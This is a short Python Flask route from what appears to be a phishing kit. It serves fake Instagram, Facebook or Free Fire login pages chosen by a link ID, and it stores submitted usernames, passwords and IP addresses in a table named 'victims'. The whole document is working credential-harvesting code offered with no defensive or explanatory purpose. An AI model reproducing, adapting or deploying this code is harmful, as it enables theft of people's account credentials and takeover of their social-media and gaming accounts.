@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    
    template_name = result[0]
    
    if request.method == 'POST':
        try:
            username = request.form.get('username', '').strip()
            password = request.form.get('password', '').strip()
            ip = request.remote_addr
            
            if not username or not password:
                return jsonify({"status": "error", "message": "All fields required"}), 400
            
            c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                      (link_id, username, password, ip, datetime.now()))
            conn.commit()
            conn.close()
            return jsonify({"status": "success", "message": "Information saved"})
        
        except Exception as e:
            conn.rollback()
            conn.close()
            return jsonify({"status": "error", "message": str(e)}), 500
    
    conn.close()
    
    if template_name == 'instagram':
        return render_template('instagram.html')
    elif template_name == 'facebook':
        return render_template('facebook.html')
    elif template_name == 'freefire':
        return render_template('freefire.html')
    else:
        return "Invalid template", 400
